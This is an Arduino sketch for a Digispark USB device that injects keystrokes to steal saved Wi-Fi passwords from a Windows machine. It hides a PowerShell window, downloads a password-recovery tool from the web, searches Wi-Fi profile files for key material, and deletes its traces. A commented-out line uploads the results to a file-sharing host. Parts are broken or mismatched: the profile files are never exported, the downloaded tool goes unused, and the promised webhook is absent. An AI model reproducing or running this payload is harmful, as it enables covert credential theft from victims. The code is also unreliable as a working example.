/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook
*/

#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 3; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd $Env:temp"); 
  DigiKeyboard.delay(500);
  //Download WebBrowserPassView
  DigiKeyboard.println("Invoke-WebRequest -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -Outfile da3w23sf.zip"); 
  DigiKeyboard.delay(500);
  //Unzip file
  DigiKeyboard.println("Expand-Archive da3w23sf.zip -DestinationPath addf3asd" ); 
  DigiKeyboard.delay(500);

  DigiKeyboard.println("Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); 
  DigiKeyboard.delay(500);
  //DigiKeyboard.println("powershell curl.exe -F file=@Wi-Fi-PASS https://api.anonfiles.com/upload?token=<Your-token>>"); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}